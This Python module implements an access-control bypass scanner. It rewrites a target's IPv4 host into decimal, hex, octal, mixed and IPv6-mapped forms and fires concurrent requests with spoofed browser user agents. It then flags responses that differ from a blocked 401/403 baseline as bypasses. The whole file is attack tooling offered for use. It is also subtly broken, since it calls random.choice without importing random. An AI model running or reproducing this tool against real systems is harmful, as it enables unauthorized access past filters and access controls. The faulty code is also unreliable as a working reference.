import asyncio
import ipaddress
import logging
import hashlib
import re
from typing import List, Dict, Optional, Any, Mapping, Tuple
from urllib.parse import urlparse, urlunparse

logger = logging.getLogger(__name__)

class DotlessIPEngine:
    def __init__(self, *, max_payloads: int = 64, max_concurrency: int = 12, include_ipv6_mapped: bool = True):
        self.max_payloads = max_payloads
        self.max_concurrency = max_concurrency
        self.include_ipv6_mapped = include_ipv6_mapped
        self.user_agents: List[Tuple[str, str]] = [
            ("desktop-chrome",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
            ("desktop-firefox",
             "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"),
            ("desktop-safari",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
             "(KHTML, like Gecko) Version/17.2 Safari/605.1.15"),
        ]

    async def generate_payloads(self, target_url: str, http_client=None) -> List[str]:
        parsed = urlparse(target_url)
        if not parsed.hostname:
            return []

        if not self._is_ipv4_address(parsed.hostname):
            logger.debug("[DotlessIP] Host is not IPv4 literal; skipping generation.")
            return []

        ip = parsed.hostname
        payloads: List[str] = []
        seen: set = set()

        def add_host(h: str):
            if not h:
                return
            netloc = h
            if parsed.port:
                netloc += f":{parsed.port}"
            if parsed.username:
                creds = parsed.username
                if parsed.password:
                    creds += f":{parsed.password}"
                netloc = f"{creds}@{netloc}"
            url = urlunparse((parsed.scheme, netloc, parsed.path, parsed.params, parsed.query, parsed.fragment))
            if url not in seen:
                seen.add(url)
                payloads.append(url)

        dword = self._ip_to_dword(ip)                   
        hex_flat = self._ip_to_hex(ip)                   
        hex_flat_noprefix = self._ip_to_hex_no_prefix(ip)
        hex_dotted = self._ip_to_hex_dotted(ip, with_prefix=True) 
        hex_dotted_np = self._ip_to_hex_dotted(ip, with_prefix=False) 
        oct_dotted = self._ip_to_octal_dotted(ip)       
        mixed1 = self._ip_to_mixed(ip)      

        for h in (dword, hex_flat, hex_flat_noprefix, hex_dotted, hex_dotted_np, oct_dotted, mixed1):
            if h:
                add_host(h)

        if self.include_ipv6_mapped:
            v6 = f"[::ffff:{ip}]"
            add_host(v6)

        if len(payloads) > self.max_payloads:
            payloads = self._stable_cap(payloads, self.max_payloads)

        logger.info(f"[DotlessIP] Generated {len(payloads)} payload URLs")
        return payloads

    async def test_payloads(self, target_url: str, payloads: List[str], http_client) -> List[Dict[str, Any]]:
        results: List[Dict[str, Any]] = []
        sem = asyncio.Semaphore(self.max_concurrency)
        baseline = await self._get_snapshot(http_client, target_url)

        async def run_one(url: str) -> Optional[Dict[str, Any]]:
            try:
                async with sem:
                    snap = await self._get_snapshot(http_client, url)
                if not snap or not baseline:
                    return None

                if self._is_valid_bypass_snapshot(snap, baseline):
                    finding = {
                        "payload": url,
                        "url": url,
                        "status_code": snap["status"],
                        "response_size": len(snap["body"]),
                        "technique": "dotless_ip",
                        "proof": {
                            "cookie_fp": snap["cookie_fp"],
                            "body_len": len(snap["body"]),
                            "body_md5": snap["body_md5"],
                            "headers_sample": dict(list(snap["headers"].items())[:6]),
                        },
                    }
                    logger.info(f"[DotlessIP] Bypass found via host form: {url}")
                    return finding
            except Exception as e:
                logger.debug(f"[DotlessIP] Test error for {url}: {e}")
            return None

        tasks = [asyncio.create_task(run_one(u)) for u in payloads]
        for res in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(res, Exception):
                logger.debug(f"[DotlessIP] Task error: {res}")
                continue
            if res:
                results.append(res)

        return results

    async def _get_snapshot(self, http_client, url: str) -> Optional[Dict[str, Any]]:
        try:
            ua = random.choice(self.user_agents)[1]
            resp = await self._safe_get(http_client, url, headers={"User-Agent": ua}, timeout=12)
            if not resp:
                return None
            status, headers, body = await self._normalize_response(resp)
            h = _lower_headers(headers)
            body_s = body if isinstance(body, str) else ""
            return {
                "status": status,
                "headers": h,
                "body": body_s,
                "body_md5": hashlib.md5(body_s.encode("utf-8", errors="ignore")).hexdigest(),
                "cookie_fp": self._cookie_fingerprint(h.get("set-cookie", "")),
            }
        except Exception as e:
            logger.debug(f"[DotlessIP] Snapshot failed for {url}: {e}")
            return None

    async def _safe_get(self, http_client, url: str, headers: Optional[Dict[str, str]] = None, timeout: int = 12):
        try:
            return await http_client.get(url, headers=headers or {}, timeout=timeout, follow_redirects=True)
        except TypeError:
            try:
                return await http_client.get(url, headers=headers or {}, timeout=timeout)
            except Exception as e:
                logger.debug(f"_safe_get failed for {url}: {e}")
                return None
        except Exception as e:
            logger.debug(f"_safe_get failed for {url}: {e}")
            return None

    async def _normalize_response(self, resp) -> Tuple[int, Mapping[str, str], str]:
        status = getattr(resp, "status_code", None)
        if status is None:
            status = getattr(resp, "status", None)
        if status is None:
            status = 0

        headers = getattr(resp, "headers", {}) or {}
        text_val = getattr(resp, "text", None)
        if isinstance(text_val, str):
            body = text_val
        else:
            body = ""
            try:
                if callable(text_val):
                    maybe = text_val()
                    if asyncio.iscoroutine(maybe):
                        body = await maybe
                    else:
                        body = str(maybe) if maybe is not None else ""
            except Exception:
                body = ""
        return int(status), headers, body

    def _is_valid_bypass_snapshot(self, snap: Dict[str, Any], baseline: Dict[str, Any]) -> bool:
        status = snap["status"]
        body = snap["body"] if isinstance(snap["body"], str) else ""
        lbody = body.lower()

        if not (200 <= status < 300):
            return False

        block_indicators = ["access denied", "forbidden", "unauthorized", "blocked", "not authorized", "captcha"]
        if any(b in lbody for b in block_indicators):
            return False

        b_status = baseline["status"]
        b_body = baseline["body"]

        if b_status in (401, 403, 404):
            if snap["cookie_fp"] != baseline["cookie_fp"]:
                return True
            if snap["body_md5"] != baseline["body_md5"]:
                return True
            if abs(len(b_body) - len(body)) > max(64, int(0.15 * max(len(b_body), len(body)))):
                return True
            return False

        same_len_ratio = min(len(b_body), len(body)) / max(1, max(len(b_body), len(body)))
        if same_len_ratio > 0.95 and snap["body_md5"] == baseline["body_md5"]:
            return False

        if snap["cookie_fp"] != baseline["cookie_fp"]:
            return True
        if abs(len(b_body) - len(body)) > max(64, int(0.10 * max(len(b_body), len(body)))):
            return True

        return False

    def _is_ipv4_address(self, hostname: str) -> bool:
        try:
            return isinstance(ipaddress.ip_address(hostname), ipaddress.IPv4Address)
        except ValueError:
            return False

    def _ip_to_dword(self, ip: str) -> Optional[str]:
        try:
            parts = [int(p) for p in ip.split(".")]
            if len(parts) != 4 or any(not (0 <= p <= 255) for p in parts):
                return None
            dword = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
            return str(dword)
        except Exception:
            return None

    def _ip_to_hex(self, ip: str) -> Optional[str]:
        try:
            parts = [int(p) for p in ip.split(".")]
            if len(parts) != 4:
                return None
            return "0x" + "".join(f"{p:02x}" for p in parts)
        except Exception:
            return None

    def _ip_to_hex_no_prefix(self, ip: str) -> Optional[str]:
        try:
            parts = [int(p) for p in ip.split(".")]
            if len(parts) != 4:
                return None
            return "".join(f"{p:02x}" for p in parts)
        except Exception:
            return None

    def _ip_to_hex_dotted(self, ip: str, with_prefix: bool = True) -> Optional[str]:
        try:
            parts = [int(p) for p in ip.split(".")]
            if len(parts) != 4:
                return None
            if with_prefix:
                return ".".join(f"0x{p:02x}" for p in parts)
            return ".".join(f"{p:02x}" for p in parts)
        except Exception:
            return None

    def _ip_to_octal_dotted(self, ip: str) -> Optional[str]:
        try:
            parts = [int(p) for p in ip.split(".")]
            if len(parts) != 4:
                return None
            return ".".join(f"{p:04o}" for p in parts)
        except Exception:
            return None

    def _ip_to_mixed(self, ip: str) -> Optional[str]:
        try:
            a, b, c, d = [int(p) for p in ip.split(".")]
            return ".".join([str(a), f"{b:02x}", f"{c:04o}", str(d)])
        except Exception:
            return None

    def _stable_cap(self, items: List[str], k: int) -> List[str]:
        scored = [(hashlib.sha1(i.encode("utf-8")).hexdigest(), i) for i in items]
        scored.sort(key=lambda x: x[0])
        return [i for _, i in scored[:k]]

    def _cookie_fingerprint(self, set_cookie_val: str) -> str:
        sc = set_cookie_val or ""
        if not sc:
            return "none"
        parts = [p.strip() for p in re.split(r",(?=[^ ;]+=)", sc)]
        names = []
        for p in parts:
            name = p.split("=", 1)[0].strip().lower()
            attrs = set()
            for a in ("httponly", "secure", "samesite", "path", "domain", "max-age"):
                if re.search(rf"\b{a}\b", p, re.I):
                    attrs.add(a)
            names.append(f"{name};{'|'.join(sorted(attrs))}")
        names.sort()
        return hashlib.sha1(";".join(names).encode("utf-8")).hexdigest()

def _lower_headers(h: Mapping[str, str]) -> Dict[str, str]:
    try:
        return {str(k).lower(): str(v) for k, v in dict(h or {}).items()}
    except Exception:
        out: Dict[str, str] = {}
        try:
            for k in h.keys():
                out[str(k).lower()] = str(h.get(k))
        except Exception:
            pass
        return out
